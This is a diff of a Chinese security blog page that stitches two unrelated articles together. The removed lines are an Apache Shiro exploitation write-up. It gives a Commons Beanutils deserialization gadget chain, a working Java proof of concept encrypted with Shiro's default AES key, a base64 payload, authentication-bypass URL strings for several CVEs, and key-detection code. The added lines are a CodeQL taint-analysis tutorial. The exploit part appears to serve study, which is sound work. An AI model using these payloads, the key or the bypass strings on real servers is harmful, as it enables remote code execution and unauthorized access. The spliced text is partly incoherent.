-<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211214161935252.png" alt="image-20211214161935252"></p>
-<h2 id="0x03-Commons-Beanutils利用链"><a href="#0x03-Commons-Beanutils利用链" class="headerlink" title="0x03 Commons Beanutils利用链"></a>0x03 Commons Beanutils利用链</h2><p>3.1    利用链：</p>
-<pre><code>ObjectInputStream.readObject()
-  PriorityQueue.readObject()
-    PriorityQueue.heapify()
-      PriorityQueue.siftDown()
-            PriorityQueue.siftDownUsingComparator()
-                  BeanComparator.compare()
-                       PropertyUtils.getProperty()                                                                       TemplatesImpl.  getoutputproperties()
-                           TemplatesImpl.newTransformer()    
-                           TemplatesImpl.getTransletInstance()
-                           TemplatesImpl.defineTransletClasses()
-                           newInstance()
-                        Runtime.exec()
-</code></pre>
-<p>3.2    这里使用的是shiro自带的Commons Beanutils工具包。它提供了javabean的一些操作方法,比如getter、setter、compare等方法。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211219112526508.png" alt="image-20211219112526508"></p>
-<p>首先我们先认识一下两个类:</p>
-<p> 1.org.apache.commons.beanutils.PropertyUtils.getProperty</p>
-<p>让使用者可以直接调用任意JavaBean的getter方法。</p>
-<pre><code>PropertyUtils.getProperty(new Person(), &quot;name&quot;);
-</code></pre>
-<p>2.org.apache.commons.beanutils.BeanComparator</p>
-<p>BeanComparator 是commons-beanutils提供的用来比较两个JavaBean是否相等的类，其实现了<br>java.util.Comparator 接口。我们看它的compare方法：</p>
-<pre><code>public int compare( final T o1, final T o2 ) &#123;
-  if ( property == null ) &#123;
-    // compare the actual objects
-    return internalCompare( o1, o2 );
- &#125;
-  try &#123;
-    final Object value1 = PropertyUtils.getProperty( o1, property );
-    final Object value2 = PropertyUtils.getProperty( o2, property );
-    return internalCompare( value1, value2 );
- &#125;
-  catch ( final IllegalAccessException iae ) &#123;
-    throw new RuntimeException( &quot;IllegalAccessException: &quot; +
-iae.toString() );
- &#125;
-  catch ( final InvocationTargetException ite ) &#123;
-    throw new RuntimeException( &quot;InvocationTargetException: &quot; +
-ite.toString() );
- &#125;
-  catch ( final NoSuchMethodException nsme ) &#123;
-    throw new RuntimeException( &quot;NoSuchMethodException: &quot; +
-nsme.toString() );
- &#125;
-&#125;
-</code></pre>
-<p>当this.property 为空时，对传入的两个对象进行Compare；如果 this.property 不<br>为空，则用 PropertyUtils.getProperty 分别取这两个对象的 this.property 属性，比较属性的值，这是重点，我们要控制this.property不为空 ，从而去调用PropertyUtils.getProperty。</p>
-<p>那么有个疑问，为什么要去调用PropertyUtils.getProperty呢？</p>
-<p>因为，PropertyUtils.getProperty的作用是可以调用调用任意JavaBean的getter方法。所以我们可以去调用templatesImpl.getOutputProperties方法。getOutputProperties方法中调用了自己的newTransformer方法，从而触发后续的RCE。</p>
-<p>3.2    POC：</p>
-<pre><code>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import javassist.ClassPool;
-import javassist.CtClass;
-import org.apache.commons.beanutils.BeanComparator;
-import java.io.ByteArrayOutputStream;
-import java.io.ObjectOutputStream;
-import java.lang.reflect.Field;
-import java.util.PriorityQueue;
-public class CommonsBeanutilsShiroTest &#123;
-    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;
-        Field field = obj.getClass().getDeclaredField(fieldName);
-        field.setAccessible(true);
-        field.set(obj, value);
-    &#125;
-
-
-    public byte[] getPayload() throws Exception &#123;
-
-
-        String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
-
-        //动态创建一个静态代码块，内容是Runtime.getRuntime().exec(&quot;calc&quot;)
-        ClassPool classPool=ClassPool.getDefault();
-        classPool.appendClassPath(AbstractTranslet);
-        CtClass payload=classPool.makeClass(&quot;cmd&quot;);
-        payload.setSuperclass(classPool.get(AbstractTranslet)); 
-       payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;); 
-        byte[] bytes=payload.toBytecode();//将动态代码块转换字节码赋予给byte数组
-
-
-        TemplatesImpl obj = new TemplatesImpl();
-        setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);
-        setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
-        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
-
-        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
-        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
-        queue.add(&quot;1&quot;);
-        queue.add(&quot;1&quot;);
-
-        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);
-        setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);
-
-        // 生成序列化字符串
-        ByteArrayOutputStream barr = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(barr);
-        oos.writeObject(queue);
-        oos.close();
-
-        return barr.toByteArray();
-
-
-    &#125;
-&#125;
-</code></pre>
-<p>测试类：</p>
-<pre><code>public class Client2 &#123;
-    public static void main(String []args) throws Exception &#123;
-
-        byte[] payloads = new CommonsBeanutilsShiroTest().getPayload();
-        AesCipherService aes = new AesCipherService();
-        byte[] key = java.util.Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);
-
-        ByteSource ciphertext = aes.encrypt(payloads, key);
-        System.out.printf(ciphertext.toString());
-    &#125;
-&#125;
-</code></pre>
-<p>复现：运行测试类,复制字节码，启动shiro环境。构造数据包进行发包，成功触发计算器。</p>
-<p>字节码：</p>
-<pre><code>GZPReCC1KobPE/KDBMHmj2rtPe+umB1i/1xPLBHfrsbHnOYN+Wjd+himW5PbiYiuS1j/I4lraT1t3+yFGzJPQci0M1ffDagNsG2f5p+e+wEgON25IkdcM2ZRlW6DvD8iTZgSiBG19gnzjCnKIJfrBx836wBFBg4sRk5NDOfc6KBkggWb4hi5rIjSaxB86dYezCLJWvwqWDcvOxkRXLBBSIM8R12H2VzF1PgdRtXI7d8UwdidiEcBrMNecwx6omHdLENt/yTCV0jhwuGq0lRyDTUXqg1N51zju7PMC6k38XQ1D5WY+P1EPlwoIeZ37tgCK7MSGvBObadle/UwRGTj1wzQwZTR5WgtRxIT7vtlUQF4zWVPVWy/UHZA5phAwvyIiUu5ojOjuZaYP0794BxoH9YSHLw86sx5WAHIQaI11PWKR+AVJUMRGlHcbx0dC+A5l73K+l0ei3ULN87/z0OufclpQbbJ0+Tl6RnTCOfhfbUSO9JaVAX0N31DDkAnehyDTvTciEov51Sdjp0QFhzUw2XNtOmoDkNrdefthbxRJb11n3UtEl5obBhWNbTRRbMcBV5dnA0vn+bf/vgbbXzPzZhmM8NJWCQKzP64MrjxhTksgh9sdA/EMMfyctPFmj89gFs0LLuC6ONQbjSA+M5eZBZzDjAAdxC+DqWzZ/kbGyeO+fnLnjItK9N4md/8c7BKJNxlxbcOIMpU3PClHZi0Szp7R4QJUi68kRMSNxr27kR9zfXAQsgAgDwtcBy0AW51vH9ulpXf6wJh3MaP/nugStATzilSN6cv0kRmHAA6gPgCXJXZFCMHcod2ippvmyH50viFTRo2t0+8+8xqHPiGdoa/nHS7hCIPDejSBGuT/X9vnXXDoePfaGrTjj0QBv65ye0sCXGUD3/Fx3TkdhywQ/1WssIiJcqhbca5YuP8zSZdJH6mQdr2qRxAVhCpn62HaS2cKPGQUuYvuRebgPCD8SAkutQ4Y0t69VZvg6sYDSPxD4xgz1XU91DoowEJnig539rd4wdG6eGL+sDpwTQjLeE9EEcH56+dm6jht+9Fn66jFM5iEaWJ82KeeyMO7T0IgfYz0EjdL1OFELgaELU2jFFWgAVRqWLg5oCEu2FrOXPgm0EaP0R1MUUk1vovvMNUDuGBMmk/6BFHU5fYMs3yqFrR6vUvVuiErLVk3Ivq/iaCiG0cRURhIOhbf9hYqTKan4nAdvu4zWNjbR42YtC1vgcoxujSeDZgpco5L5thyAv07PPVwAyDKmFZcpoZrz+XwzNKiByTH7ORPvGLTCKsHbTpRfoEz1UuMac3rMB3xtk=
-</code></pre>
-<p><img src="C:\Users\20174\AppData\Roaming\Typora\typora-user-images\image-20211219115839737.png" alt="image-20211219115839737"></p>
-<p>3.4    疑问：</p>
-<p>1.一开始，我控制BeanComparator.compare中的property。我是直接通过构造器去配置，但是报错了。</p>
-<pre><code>BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;,String.CASE_INSENSITIVE_ORDER);
-</code></pre>
-<p><img src="C:\Users\20174\AppData\Roaming\Typora\typora-user-images\image-20211219222301499.png" alt="image-20211219222301499"></p>
-<p>原因：因为在序列化的时候，priorityQueue.add(1)，会调用到BeanComparator.compare方法。可以看图中，因为这里的形参o1其实我们还没设置。所以才报的异常，这里的o1是需要在反序列化的时候直接传值的，所以我们只能先设置property为null，后面再通过反射去设置它的值。</p>
-<p><img src="C:\Users\20174\AppData\Roaming\Typora\typora-user-images\image-20211219222231766.png" alt="image-20211219222231766"></p>
-<h2 id="0x04-基于Tomcat全局存储进行回显（但shiro不出网情况下，可通过回显进行判断key存不存在）"><a href="#0x04-基于Tomcat全局存储进行回显（但shiro不出网情况下，可通过回显进行判断key存不存在）" class="headerlink" title="0x04 基于Tomcat全局存储进行回显（但shiro不出网情况下，可通过回显进行判断key存不存在）"></a>0x04 基于Tomcat全局存储进行回显（但shiro不出网情况下，可通过回显进行判断key存不存在）</h2><p>目的：如何在tomcat中获得response</p>
-<p>复现：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211221095841370.png" alt="image-20211221095841370"></p>
-<p>其他思路：Linux下基于文件描述符的反序列化回显方式的思路</p>
-<h2 id="0x04-shiro721"><a href="#0x04-shiro721" class="headerlink" title="0x04 shiro721"></a>0x04 shiro721</h2><p>版本：Apache Shiro &lt; 1.4.2</p>
-<p>默认使用AES/GCM/PKCS5Padding模式 </p>
-<p>这个洞比较鸡肋，需要登陆后才能使用，并且它的加密方式决定了我们发送的payload越长，爆破方式去加密payload的过程越长</p>
-<p>有兴趣可以看下这位师傅的文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/qianxinggz/p/13388405.html">https://www.cnblogs.com/qianxinggz/p/13388405.html</a></p>
-<h2 id="0x04-权限绕过"><a href="#0x04-权限绕过" class="headerlink" title="0x04 权限绕过"></a>0x04 权限绕过</h2><p>CVE-2020-11989</p>
-<ul>
-<li>Apache Shiro &lt; 1.5.3</li>
+</li>
 </ul>
-<p>利用：/admin/xxx%252fxxx/</p>
-<p>漏洞修复：在1.5.3版本，采用标准的 getServletPath 和 getPathInfo 进行uri处理，同时取消了url解码，这样<code>pattIdxStart</code>与<code>pattIdxEnd</code>就是相同的数值</p>
-<p>CVE-2020-13933</p>
-<ul>
-<li>Apache Shiro &lt; 1.6.0</li>
+</li>
 </ul>
-<p>利用：/admin/%3beee</p>
-<p>漏洞修复：加了一个fileter类进行过滤。</p>
-<p>CVE-2020-17523</p>
-<ul>
-<li>Apache Shiro &lt; 1.7.1</li>
-</ul>
-<p>利用：admin/%20</p>
-<h2 id="0x04-shiro框架-key爆破"><a href="#0x04-shiro框架-key爆破" class="headerlink" title="0x04 shiro框架 key爆破"></a>0x04 shiro框架 key爆破</h2><p>4.1 CC盲打，判断延迟</p>
-<p>4.2 YSO 的 URLDNS 针对 dnslog </p>
-<p>4.3 回显头中有没有 deleteMe</p>
-<ol>
-<li>我们需要构造一个继承于 <strong>PrincipalCollection</strong> 的序列化对象</li>
-</ol>
-<pre><code>public class shirokey &#123;
-    public static void main(String[] args) throws Exception &#123;
-        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
-        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(&quot;E:\\detect.ser&quot;));
-        obj.writeObject(simplePrincipalCollection);
-        obj.close();
-    &#125;
+<p>查询程序中的所有int类型的变量：</p>
+<pre><code>import java
+from Variable v, PrimitiveType pt
+where pt=v.getType() and
+    pt.hasName(&quot;int&quot;)
+select v
+</code></pre>
+<p>查询所有的声明类型和编译类型不同的类型：</p>
+<pre><code>import java
+from TopLevelType tl
+where tl.getName() != tl.getCompilationUnit().getName()
+select tl
+</code></pre>
+<p>还有很多其他单例类：</p>
+<p><code>TypeObject</code>, <code>TypeCloneable</code>, <code>TypeRuntime</code>, <code>TypeSerializable</code>, <code>TypeString</code>, <code>TypeSystem</code> and <code>TypeClass</code>.</p>
+<p>查询程序中的所有直接extends了Object类的嵌套类；</p>
+<pre><code>import java
 
+from NestedClass nc
+where nc.getASupertype() instanceof TypeObject
+select nc
+</code></pre>
+<p>泛型Genetics</p>
+<p>CodeQL设计了若干个Type子类负责处理Java中的泛型</p>
+<pre><code>GenericType
+├── GenericInterface // 泛型接口
+└── GenericClass // 泛型类
+package java.util.;
+
+public interface Map&lt;K, V&gt; &#123;
+    int size();
+
+    // ...
 &#125;
 </code></pre>
-<pre><code>public class shiroaes &#123;
-    public static void main(String[] args) throws Exception &#123;
-        String path = &quot;E:\\detect.ser&quot;;
-        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);
-        AesCipherService aes = new AesCipherService();
-        ByteSource ciphertext = aes.encrypt(getBytes(path), key);
-        System.out.printf(ciphertext.toString());
-    &#125;
-
-
-    public static byte[] getBytes(String path) throws Exception&#123;
-        InputStream inputStream = new FileInputStream(path);
-        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-        int n = 0;
-        while ((n=inputStream.read())!=-1)&#123;
-            byteArrayOutputStream.write(n);
-        &#125;
-        byte[] bytes = byteArrayOutputStream.toByteArray();
-        return bytes;
+<h3 id="（4）常见方法-这里写的比较杂，主要是把一些常见的方法整合起来，方便后续查看"><a href="#（4）常见方法-这里写的比较杂，主要是把一些常见的方法整合起来，方便后续查看" class="headerlink" title="（4）常见方法(这里写的比较杂，主要是把一些常见的方法整合起来，方便后续查看)"></a>（4）常见方法(这里写的比较杂，主要是把一些常见的方法整合起来，方便后续查看)</h3><p>hasQualifiedName()：设置指定类名</p>
+<pre><code>class Logger extends RefType &#123;
+    Logger()&#123;
+        this.hasQualifiedName(&quot;org.apache.logging.log4j.spi&quot;, &quot;AbstractLogger&quot;)
     &#125;
 &#125;
 </code></pre>
-<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211221144240860.png" alt="image-20211221144240860"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20211221144230522.png" alt="image-20211221144230522"></p>
-<h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>前前后后踩了好多坑，也从中学习到了很多，今天文中的这条不出意外的话应该是 Tomcat 的版本都可行的，最后感谢 p牛 感谢 <a target="_blank" rel="noopener" href="http://wjlshare.com/">大木头师傅</a> 感谢各位前辈。</p>
-<p> <strong><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ">https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ</a></strong></p>
-<p><a target="_blank" rel="noopener" href="https://hpdoger.cn/2021/02/08/title:%20Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%B1%87%E6%80%BB/#CVE-2020-11989">https://hpdoger.cn/2021/02/08/title:%20Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%B1%87%E6%80%BB/#CVE-2020-11989</a></p>
+<p>hasName()：设置指定方法名</p>
+<p>getNumberOfParameters()：获取此可调用的形式参数的数量</p>
+<pre><code>class LoggerInput extends Method &#123;
+    LoggerInput()&#123;
+        this.getDeclaringType() instanceof Logger
+        and 
+        this.hasName(&quot;error&quot;)
+        and
+        this.getNumberOfParameters() = 1
+    &#125;
+&#125;
+</code></pre>
+<p>getArgument(0)：获取此构造函数调用中指定（从零开始）位置的参数</p>
+<p>getMethod() 获取此方法访问所访问的方法。</p>
+<p>getDeclaringType() 获取该成员所属的类或接口</p>
+<p>getAnAncestor() 获取此类型的直接或间接超类型，包括其自身</p>
+<p>asParameter()  获取该节点对应的参数，如果有的话。</p>
+<p>类<code>Type</code>及其子类表示java中的类。<br> <code>PrimitiveType</code>表示基础数据类型：<br> <code>RefType</code>及其子类表示引用数据类型。<br>getASupertype<code>和</code>getASubtype`返回它的直接父类和子类。</p>
+<pre><code class="csharp">import java
+
+from Class B
+where B.hasName(&quot;ShiroRealm&quot;)
+select B.getASupertype+()
+</code></pre>
+<p>getAMember()  可以获得所有的member(包括field, method, constructor等</p>
+<pre><code class="csharp">import java
+
+from RefType R
+where R.hasName(&quot;ShiroRealm&quot;)
+select R.getAMember()
+</code></pre>
+<p>inherits(Method m) 判断是否声明或者继承了方法m</p>
+<p>找到实现了方法doGetAuthorizationInfo的类：</p>
+<pre><code class="csharp">import java
+
+from RefType R, Method m
+where m.hasName(&quot;doGetAuthorizationInfo&quot;) and R.inherits(m)
+select R
+</code></pre>
+<p>指定继承某一个类：</p>
+<pre><code>class Logger extends  RefType&#123;
+    Logger()&#123;
+        this.hasQualifiedName(&quot;org.apache.logging.log4j.spi&quot;, &quot;AbstractLogger&quot;)
+    &#125;
+&#125;
+</code></pre>
+<h3 id="（5）谓词"><a href="#（5）谓词" class="headerlink" title="（5）谓词"></a>（5）谓词</h3><p>和SQL一样，where部分的查询条件如果过长，会显得很乱。CodeQL提供一种机制可以让你把很长的查询语句封装成函数，这个函数，就叫谓词</p>
+<p>比如上面的我们可以改成这样：</p>
+<pre><code>import java
+//谓词
+
+predicate isMethod (Method method) &#123;
+    exists( |method.hasName(&quot;getUserList&quot;) )
+&#125;
+from Method method
+where isMethod(method)
+select method.getName(),method.getDeclaringType()
+</code></pre>
+<p>predicate 表示当前方法没有返回值。</p>
+<p>exists子查询，是CodeQL谓词语法里非常常见的语法结构，它根据内部的子查询返回true or false，来决定筛选出哪些数据。</p>
+<p>局部数据流</p>
+<p>在一个单独的函数中的数据流，简单且比全局更精确。</p>
+<p>局部数据流的相关库在 DataFlow 模块中，它被定义为 Node 类，表示数据可以流经的任何元素。Node 被分为表达式 (ExprNode) 和参数 (ParameterNode) 两种。使用成员谓词 asExpr 和 asParameter 可以在数据流 node 和表达式 / 参数 node 之间进行映射</p>
+<pre><code>class Node &#123;
+  /** 获取代码中该节点相应的表达式(如果有的话). */
+  Expr asExpr() &#123; ... &#125;
+
+  /** 获取代码中该节点相应的参数(如果有的话). */
+  Parameter asParameter() &#123; ... &#125;
+
+  ...
+&#125;
+</code></pre>
+<p>例如，从零个或多个局部步骤中查找从参数 sourece 到表达式 sink 的污染传播：</p>
+<pre><code>TaintTracking::localTaint(DataFlow::parameterNode(source), DataFlow::exprNode(sink))
+</code></pre>
+<h3 id="（6）污点分析"><a href="#（6）污点分析" class="headerlink" title="（6）污点分析"></a>（6）污点分析</h3><p>source，sink、sanitizer、isAdditionalTaintStep</p>
+<p>source是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。</p>
+<p>sink是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。</p>
+<p>sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer(需要的时候再写，非必需)。</p>
+<p>isAdditionalTaintStep：而对于某个第三方包中的函数调用，CodeQL也自然无法知道该函数调用是否会导致污点数据被过滤，因此CodeQL默认认为会被过滤，这样又会产生许多漏报，此时就需要我们自己定义isAdditionalTaintStep谓词来告诉CodeQL哪些调用还是污点传播。</p>
+<p>简单理解就是：</p>
+<p>但source的数据可以传递到sink中，就说明链路可用，证明漏洞存在。</p>
+<p><img src="https://image.3001.net/images/20210808/1628394339_610f53637de77e9114e4f.jpg!small" alt="image"></p>
+<h3 id="（7）案例分析"><a href="#（7）案例分析" class="headerlink" title="（7）案例分析"></a>（7）案例分析</h3><p>1.输出Taint，可以快速生成模板</p>
+<p><img src="https://blog.jus4fun.xyz/static/articlesImg/file_1641370365000_1641370367032.png" alt="img"></p>
+<p><img src="C:\Users\20174\AppData\Roaming\Typora\typora-user-images\image-20220115113026035.png" alt="image-20220115113026035"></p>
+<p>2.导入导入相关<code>qll</code>库</p>
+<pre><code>import java
+import semmle.code.java.dataflow.FlowSources
+import DataFlow::PathGraph
+</code></pre>
+<p>3.设置Source起点</p>
+<p>source就是前端传到后端，后端进行接收的入口，比如是SpringBoot框架的话，就是Controller层就是source。</p>
+<p>这里我们可以使用自带的Srource入口emoteFlowSource，这个入口包含了Spring Boot，所以我们可以直接使用。</p>
+<pre><code>override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;
+</code></pre>
+<p>PS：那就有个疑问了，如果不是spirngboot框架，那怎么设置source呢，可以看取request参数用的是什么方法，那ofcms举个例子：</p>
+<p><img src="C:\Users\20174\AppData\Roaming\Typora\typora-user-images\image-20220119162852713.png" alt="image-20220119162852713"></p>
+<p><img src="C:\Users\20174\AppData\Roaming\Typora\typora-user-images\image-20220119162915040.png" alt="image-20220119162915040"></p>
+<p>可以观察上图，从request请求中取参数，用的是Controller类中的getPara方法，所以我们可以创建一个类：</p>
+<pre><code>class OfCmsSource extends MethodAccess&#123;
+    OfCmsSource()&#123;
+        (this.getMethod().getDeclaringType*().hasQualifiedName(&quot;com.ofsoft.cms.admin.controller&quot;, &quot;Controller&quot;) and
+        (this.getMethod().getName().substring(0, 3) = &quot;get&quot;))
+ &#125;
+ //意思是，设置类为Controller类，然后设置方法为前三位是get开头的方法
+ 
+ 
+     override predicate isSource(DataFlow::Node source)&#123;
+        source.asExpr() instanceof OfCmsSource
+    &#125;
+ 
+</code></pre>
+<p>4.设置sink终点</p>
+<pre><code>override predicate isSink(DataFlow::Node node) &#123;
+        exists(MethodAccess meth |
+          meth.getMethod().hasName(&quot;createXMLStreamReader&quot;) and 
+            meth.getMethod().getDeclaringType().hasName(&quot;XMLInputFactory&quot;) and 
+            meth.getAnArgument() = node.asExpr() 
+        )
+    &#125;
+</code></pre>
+<p>注：以上代码使用了exists子查询语法，格式为exists(Obj obj| somthing), 上面查询的意思为：查找一个<code>XMLInputFactory#createXMLStreamReader</code>的代码的调用点，并把它的第一个参数设置为sink。</p>
+<p>语法讲解：</p>
+<p>meth.getMethod().hasName(“createXMLStreamReader”)：获得调用了createXMLStreamReader方法的所有类对象。</p>
+<p>meth.getMethod().getDeclaringType().hasName(“XMLInputFactory”)：获得调用了createXMLStreamReader方法的XMLInputFactory类对象。</p>
+<p>5.设置Flow数据流</p>
+<pre><code>from SqlConfig config, DataFlow::PathNode source, DataFlow::PathNode sink
+where config.hasFlowPath(source, sink)
+select sink.getNode(), source, sink, &quot;Potential XXE path&quot;
+</code></pre>
+<p>设置好Source和Sink，就相当于搞定了首尾，但是首尾是否能够连通才能决定是否存在漏洞！</p>
+<p>一个受污染的变量，能够毫无阻拦的流转到危险函数，就表示存在漏洞！</p>
+<p>这个连通工作就是CodeQL引擎本身来完成的。我们通过使用<code>config.hasFlowPath(source, sink)</code>方法来判断是否连通。</p>
+<p>完整代码如下：</p>
+<pre><code>/**
+ * @name XXE
+ * @kind path-problem
+ */
+
+import java
+import semmle.code.java.dataflow.FlowSources
+import DataFlow::PathGraph
+class XXETaintConfig extends TaintTracking::Configuration &#123;
+    XXETaintConfig() &#123; this = &quot;XXETaintConfig&quot; &#125;
+
+    override predicate isSource(DataFlow::Node node) &#123;
+        node instanceof RemoteFlowSource
+    &#125;
+
+    override predicate isSink(DataFlow::Node node) &#123;
+        exists(MethodAccess meth |
+            meth.getMethod().hasName(&quot;createXMLStreamReader&quot;) and 
+            meth.getMethod().getDeclaringType().hasName(&quot;XMLInputFactory&quot;) and 
+            meth.getAnArgument() = node.asExpr()    
+        )
+    &#125;
+&#125;
+from XXETaintConfig config, DataFlow::PathNode source, DataFlow::PathNode sink
+where config.hasFlowPath(source, sink)
+select sink.getNode(), source, sink, &quot;Potential XXE path&quot;
+</code></pre>
+<p>第二个案例分析</p>
+<p>使用codeQL进行污点分析主要步骤如下，以下以排查XXE漏洞为例：</p>
+<p>1.输出Taint，可以快速生成模板</p>
+<p><img src="https://blog.jus4fun.xyz/static/articlesImg/file_1641370365000_1641370367032.png" alt="img"></p>
+<p>按下回车可以帮助你生成出来如下图所示的模板，只需给Class起个名字即可。</p>
+<p><img src="https://blog.jus4fun.xyz/static/articlesImg/file_1641370460000_1641370460830.png" alt="img"></p>
+<p>2.导入导入相关<code>qll</code>库</p>
+<pre><code>import java
+import semmle.code.java.dataflow.FlowSources
+import DataFlow::PathGraph
+</code></pre>
+<p>3.设置Source和sink</p>
+<p>这里我们只需要填入<code>isSink</code>和<code>isSource</code>谓词的具体定义即可。例如定义source点为用户从Web网站的输入点，sink为调用了<code>XMLInputFactory#createXMLStreamReader</code>的代码。则具体代码如下：</p>
+<pre><code>class XXETaintConfig extends TaintTracking::Configuration &#123;
+    XXETaintConfig() &#123; this = &quot;XXETaintConfig&quot; &#125;
+
+    override predicate isSource(DataFlow::Node node) &#123;
+        node instanceof RemoteFlowSource
+    &#125;
+
+    override predicate isSink(DataFlow::Node node) &#123;
+        exists(MethodAccess meth |
+            meth.getMethod().hasName(&quot;createXMLStreamReader&quot;) and 
+            meth.getMethod().getDeclaringType().hasName(&quot;XMLInputFactory&quot;) and 
+            meth.getAnArgument() = node.asExpr()    
+        )
+    &#125;
+&#125;
+</code></pre>
+<p>4.设置Flow数据流</p>
+<p>之后只需要调用上面编写的<code>XXETaintConfig</code>类的<code>hasFlowPath</code>谓词来查找污点路径即可，这里有一点需要注意。path query的select语句需要遵循固定格式，要有四个字段，形如：</p>
+<pre><code>from XXETaintConfig config, DataFlow::PathNode source, DataFlow::PathNode sink
+where config.hasFlowPath(source, sink)
+select sink.getNode(), source, sink, &quot;Potential XXE path&quot;
+</code></pre>
+<p>完整代码如下：</p>
+<pre><code>/**
+ * @name XXE
+ * @kind path-problem
+ */
+
+import java
+import semmle.code.java.dataflow.FlowSources
+import DataFlow::PathGraph
+class XXETaintConfig extends TaintTracking::Configuration &#123;
+    XXETaintConfig() &#123; this = &quot;XXETaintConfig&quot; &#125;
+
+    override predicate isSource(DataFlow::Node node) &#123;
+        node instanceof RemoteFlowSource
+    &#125;
+
+    override predicate isSink(DataFlow::Node node) &#123;
+        exists(MethodAccess meth |
+            meth.getMethod().hasName(&quot;createXMLStreamReader&quot;) and 
+            meth.getMethod().getDeclaringType().hasName(&quot;XMLInputFactory&quot;) and 
+            meth.getAnArgument() = node.asExpr()    
+        )
+    &#125;
+&#125;
+from XXETaintConfig config, DataFlow::PathNode source, DataFlow::PathNode sink
+where config.hasFlowPath(source, sink)
+select sink.getNode(), source, sink, &quot;Potential XXE path&quot;
+</code></pre>
+<p>第三个方案</p>
+<pre><code>import java
+import semmle.code.java.dataflow.FlowSources
+
+class Config extends DataFlow::Configuration&#123;
+    Config()&#123;
+        this = &quot;1&quot;
+    &#125;
+    override predicate isSource(DataFlow::Node source)&#123;
+        exists(source.asExpr()) 
+    &#125;
+    
+    override predicate isSink(DataFlow::Node sink) &#123;
+        exists(Parameter p |
+            p = sink.asParameter()        //设置p为污点流
+            and 
+            p.getCallable().getName() = &quot;validateGroupMembers&quot;  //取一个名字为HelperBean的构造器
+            and
+            p.getName() = &quot;request&quot;    //取一个名字为message的形参
+            )
+    &#125;
+&#125;
+
+from Config config ,DataFlow::PathNode source, DataFlow::PathNode sink
+where config.hasFlowPath(source, sink)
+select source.getNode().getLocation(),source,sink
+</code></pre>
+<p>说明：sink把构造器HelperBean中的形参message取出来设置为污点流</p>
+<p>第四个方案</p>
+<pre><code>import java
+import semmle.code.java.dataflow.DataFlow
+
+
+// 查找调用java.lang.System.getenv(..)方法的source
+class GetenvSource extends MethodAccess &#123;
+  GetenvSource() &#123;
+    exists(Method m | m = this.getMethod() |
+      m.hasName(&quot;getenv&quot;) and
+      //m.getDeclaringType() instanceof TypeSystem
+      m.getDeclaringType().hasQualifiedName(&quot;java.lang&quot;, &quot;System&quot;)
+    )
+  &#125;
+&#125;
+
+/**
+找出全局的调用new java.net.URL()的硬编码字符串
+*/
+
+// 定义一个globa data flow
+class TestConfiguration extends DataFlow::Configuration&#123;
+    TestConfiguration()&#123;
+        this = &quot;TestConfiguration&quot;
+    &#125;
+
+    override  predicate isSource(DataFlow::Node source)&#123;
+        //source.asExpr() instanceof StringLiteral
+        source.asExpr() instanceof GetenvSource
+    &#125;
+
+    override predicate isSink(DataFlow::Node sink)&#123;
+        // 存在这样一个方法调用
+        exists(Call call|
+          // sink是call的第一个参数
+          sink.asExpr() = call.getArgument(0) and
+          // call的调用者（一个构造器）
+          call.getCallee().(Constructor).getDeclaringType().hasQualifiedName(&quot;java.net&quot;, &quot;URL&quot;)
+        )
+    &#125;
+&#125;
+
+// 开始查找
+from DataFlow::Node src, DataFlow::Node sink, TestConfiguration config
+where config.hasFlow(src, sink)
+select src,  sink
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/JuneRainBlog/img@master/image-20220118105914736.png" alt="image-20220118105914736"></p>
+<p>指定某个类的第一个参数是污点流</p>
+<pre><code>  override predicate isSink(DataFlow::Node sink) &#123;
+    exists(Call call ,Callable parseExpression|
+        sink.asExpr() = call.getArgument(0) and
+        call.getCallee()=parseExpression and 
+     parseExpression.getDeclaringType().hasQualifiedName(&quot;java.lang&quot;, &quot;ProcessBuilder&quot;) and
+        parseExpression.hasName(&quot;ProcessBuilder&quot;)
+      )
+  &#125;
